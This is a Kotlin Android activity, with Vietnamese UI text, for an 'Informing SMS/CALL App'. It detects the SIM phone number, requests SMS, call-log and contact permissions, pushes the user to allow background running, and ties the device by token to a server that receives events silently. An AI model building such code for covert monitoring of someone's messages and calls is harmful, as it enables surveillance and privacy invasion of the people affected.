package com.example.informer

import android.Manifest
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.content.ClipboardManager
import android.content.ClipData
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.work.WorkManager
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import java.util.UUID

class MainActivity : ComponentActivity() {

    private val uiPhoneNumber = MutableStateFlow("")

    private fun checkAndRequestBatteryOptimization() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                Toast.makeText(
                    this,
                    "Vui lòng chọn 'Mức sử dụng pin' -> 'Cho phép hoạt động dưới nền' để App chạy ngầm ổn định!",
                    Toast.LENGTH_LONG
                ).show()

                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:$packageName")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            } catch (e: Exception) {
                val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                startActivity(intent)
            }
        }
    }

    companion object {
        val logEvents = MutableStateFlow<List<String>>(emptyList())
        fun addLog(message: String) {
            logEvents.value = logEvents.value + message
        }

        fun formatVietnamesePhoneNumber(rawNumber: String?): String {
            if (rawNumber.isNullOrBlank()) return ""
            var cleaned = rawNumber.replace("\\s+".toRegex(), "").replace("-", "")
            val match = Regex("^\\+?[0-9]+").find(cleaned)
            if (match != null) {
                cleaned = match.value
            }
            if (cleaned.startsWith("+84")) {
                cleaned = "0" + cleaned.substring(3)
            } else if (cleaned.startsWith("84") && cleaned.length > 9) {
                cleaned = "0" + cleaned.substring(2)
            }
            return cleaned
        }
    }

    private fun getDevicePhoneNumber(): String {
        val hasNumbersPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            checkSelfPermission(Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
        val hasStatePermission = checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED

        if (hasNumbersPermission || hasStatePermission) {
            try {
                val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                val activeInfos = subscriptionManager.activeSubscriptionInfoList
                if (!activeInfos.isNullOrEmpty()) {
                    for (info in activeInfos) {
                        val number = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            subscriptionManager.getPhoneNumber(info.subscriptionId)
                        } else {
                            @Suppress("DEPRECATION")
                            info.number
                        }
                        if (!number.isNullOrEmpty()) {
                            return formatVietnamesePhoneNumber(number)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("MainActivity", "Lỗi SubscriptionManager", e)
            }

            try {
                val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                val number = telephonyManager.line1Number
                if (!number.isNullOrEmpty()) {
                    return formatVietnamesePhoneNumber(number)
                }
            } catch (e: SecurityException) {
                Log.e("MainActivity", "Lỗi TelephonyManager", e)
            }
        }
        return ""
    }

    // 🔥 Thuật toán lắng nghe Lifecycle bổ sung: Mỗi lần người dùng tương tác lại với App, tự động kiểm tra số
    override fun onResume() {
        super.onResume()
        val sharedPref = getSharedPreferences("AppConfig", Context.MODE_PRIVATE)
        if (uiPhoneNumber.value.isEmpty()) {
            val number = getDevicePhoneNumber()
            if (number.isNotEmpty()) {
                uiPhoneNumber.value = number
                sharedPref.edit().putString("my_phone", number).apply()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val sharedPref = getSharedPreferences("AppConfig", Context.MODE_PRIVATE)
        uiPhoneNumber.value = sharedPref.getString("my_phone", "") ?: ""

        triggerAutoInit(sharedPref)

        setContent {
            val events by logEvents.collectAsState()
            val phoneNumber by uiPhoneNumber.collectAsState()
            var token by remember { mutableStateOf(sharedPref.getString("token", "") ?: "") }

            // 🔥 THUẬT TOÁN ĐỒNG BỘ MỚI: Vòng lặp Coroutine chạy ngầm tự động tìm kiếm cho đến khi bốc được số
            LaunchedEffect(phoneNumber) {
                if (phoneNumber.isEmpty()) {
                    // Tạo vòng lặp vô hạn (chỉ dừng khi tìm thấy số) để không bỏ sót bất kỳ thời điểm cấp quyền nào
                    while (true) {
                        val detectedNumber = getDevicePhoneNumber()
                        if (detectedNumber.isNotEmpty()) {
                            uiPhoneNumber.value = detectedNumber
                            sharedPref.edit().putString("my_phone", detectedNumber).apply()
                            break // Tìm thấy số thành công -> Thoát vòng lặp thuật toán
                        }
                        delay(1000) // Cứ mỗi 1 giây tự động quét phần cứng một lần
                    }
                }
            }

            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(16.dp)
            ) {
                Text(
                    text = "Informing SMS/CALL App",
                    fontSize = 22.sp,
                    fontWeight = FontWeight.Bold,
                    color = MaterialTheme.colorScheme.primary,
                    modifier = Modifier.padding(bottom = 16.dp)
                )

                // 1. VÙNG HIỂN THỊ SỐ ĐIỆN THOẠI (KHOÁ CHẶT THỦ CÔNG)
                Text(
                    text = "Số điện thoại thiết bị (Tự động nhận diện):",
                    fontSize = 14.sp,
                    fontWeight = FontWeight.SemiBold,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )
                Spacer(modifier = Modifier.height(4.dp))
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(Color(0xFFECEFF1), RoundedCornerShape(4.dp))
                        .border(1.dp, Color(0xFFCFD8DC), RoundedCornerShape(4.dp))
                        .padding(horizontal = 12.dp, vertical = 12.dp)
                ) {
                    Text(
                        text = if (phoneNumber.isEmpty()) "🔄 Đang tự động quét phần cứng SIM..." else phoneNumber,
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Medium,
                        color = if (phoneNumber.isEmpty()) Color(0xFFE67E22) else Color.Black
                    )
                }

                Spacer(modifier = Modifier.height(16.dp))

                // 2. VÙNG THỂ HIỆN TOKEN
                Text(
                    text = "Mã Token định danh bảo mật:",
                    fontSize = 14.sp,
                    fontWeight = FontWeight.SemiBold,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )
                Spacer(modifier = Modifier.height(4.dp))

                if (token.isEmpty()) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            text = "Chưa có mã Token nào được tạo",
                            fontSize = 15.sp,
                            color = Color.Gray,
                            modifier = Modifier.weight(1f)
                        )

                        Button(
                            onClick = {
                                // Nếu chưa nhận dạng xong, cho phép ép hệ thống quét nóng một lần nữa tại nút bấm
                                val currentPhone = uiPhoneNumber.value.trim()
                                if (currentPhone.isEmpty()) {
                                    val forceCheckNumber = getDevicePhoneNumber()
                                    if (forceCheckNumber.isNotEmpty()) {
                                        uiPhoneNumber.value = forceCheckNumber
                                        sharedPref.edit().putString("my_phone", forceCheckNumber).apply()
                                    } else {
                                        Toast.makeText(this@MainActivity, "Hệ thống chưa quét xong SIM, vui lòng đợi vài giây!", Toast.LENGTH_LONG).show()
                                        return@Button
                                    }
                                }

                                val generatedToken = UUID.randomUUID().toString().takeLast(8).uppercase()
                                token = generatedToken

                                sharedPref.edit().apply {
                                    putString("my_phone", uiPhoneNumber.value.trim())
                                    putString("token", generatedToken)
                                    apply()
                                }

                                ServerReporter.sendEvent(
                                    context = this@MainActivity,
                                    type = "INIT",
                                    incomingNumber = "HỆ THỐNG",
                                    content = "Tài khoản được khởi tạo tự động từ phần cứng máy."
                                )

                                WorkManager.getInstance(applicationContext).cancelAllWorkByTag("SILENT_USER_CHECK")
                                UserInfoWorker.enqueueNextCheck(this@MainActivity)

                                Toast.makeText(this@MainActivity, "Đã kích hoạt thiết bị thành công!", Toast.LENGTH_SHORT).show()
                            }
                        ) {
                            Text("Kích hoạt App")
                        }
                    }
                } else {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            modifier = Modifier
                                .weight(1f)
                                .background(Color(0xFFF5F5F5), RoundedCornerShape(4.dp))
                                .border(1.dp, Color(0xFFE0E0E0), RoundedCornerShape(4.dp))
                                .padding(horizontal = 12.dp, vertical = 10.dp)
                        ) {
                            Text(
                                text = token,
                                fontSize = 16.sp,
                                fontWeight = FontWeight.Bold,
                                fontFamily = FontFamily.Monospace,
                                color = Color.Black
                            )
                        }

                        Spacer(modifier = Modifier.width(8.dp))

                        Button(
                            onClick = {
                                ServerReporter.sendEvent(
                                    context = this@MainActivity,
                                    type = "RESET",
                                    incomingNumber = "HỆ THỐNG",
                                    content = "Hủy liên kết thiết bị."
                                )
                                token = ""
                                sharedPref.edit().putString("token", "").apply()

                                WorkManager.getInstance(applicationContext).cancelAllWorkByTag("SILENT_USER_CHECK")
                                addLog("🛑 Đã dừng chu kỳ chạy ngầm định kỳ.")
                                Toast.makeText(this@MainActivity, "Đã hủy liên kết!", Toast.LENGTH_SHORT).show()
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE74C3C))
                        ) {
                            Text("Hủy mã")
                        }
                    }
                }

                Spacer(modifier = Modifier.height(20.dp))

                if (token.isNotEmpty()) {
                    Button(
                        onClick = {
                            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                            val clip = ClipData.newPlainText("Token", token)
                            clipboard.setPrimaryClip(clip)
                            Toast.makeText(this@MainActivity, "Đã sao chép Token!", Toast.LENGTH_SHORT).show()
                        },
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Copy Token sang Web")
                    }
                }

                Spacer(modifier = Modifier.height(16.dp))
                HorizontalDivider(thickness = 1.dp)
                Spacer(modifier = Modifier.height(12.dp))

                Text(
                    text = "Nhật ký đẩy dữ liệu ngầm:",
                    fontSize = 14.sp,
                    fontWeight = FontWeight.SemiBold,
                    modifier = Modifier.padding(bottom = 6.dp)
                )

                LazyColumn(
                    modifier = Modifier.fillMaxSize(),
                    verticalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    items(events) { eventText ->
                        Text(
                            text = eventText,
                            fontSize = 13.sp,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }
                }
            }
        }

        checkAndRequestPermissions()
        checkAndRequestBatteryOptimization()
    }

    private fun triggerAutoInit(sharedPref: android.content.SharedPreferences) {
        val savedPhone = sharedPref.getString("my_phone", "") ?: ""
        val savedToken = sharedPref.getString("token", "") ?: ""

        if (savedPhone.isNotEmpty() && savedToken.isNotEmpty()) {
            addLog("🔄 Hệ thống tự động kiểm tra tài khoản trực tuyến...")
            ServerReporter.sendEvent(
                context = this,
                type = "INIT",
                incomingNumber = "HỆ THỐNG",
                content = "Thiết bị tự động kết nối lại khi mở ứng dụng."
            )

            WorkManager.getInstance(applicationContext).cancelAllWorkByTag("SILENT_USER_CHECK")
            UserInfoWorker.enqueueNextCheck(this)
        }
    }

    private fun checkAndRequestPermissions() {
        val permissionsNeeded = mutableListOf<String>()

        if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.RECEIVE_SMS)
        }
        if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE)
        }
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CALL_LOG)
        }
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CONTACTS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (checkSelfPermission(Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_PHONE_NUMBERS)
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        if (permissionsNeeded.isNotEmpty()) {
            requestPermissions(permissionsNeeded.toTypedArray(), 101)
        } else {
            startMonitoringService()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
            startMonitoringService()

            // Kích hoạt quét nhanh ngay lập tức sau khi bấm nút Cho phép ở hộp thoại
            val number = getDevicePhoneNumber()
            if (number.isNotEmpty()) {
                val sharedPref = getSharedPreferences("AppConfig", Context.MODE_PRIVATE)
                sharedPref.edit().putString("my_phone", number).apply()
                uiPhoneNumber.value = number
            }
        }
    }

    private fun startMonitoringService() {
        val serviceIntent = Intent(this, BackgroundMonitoringService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }
}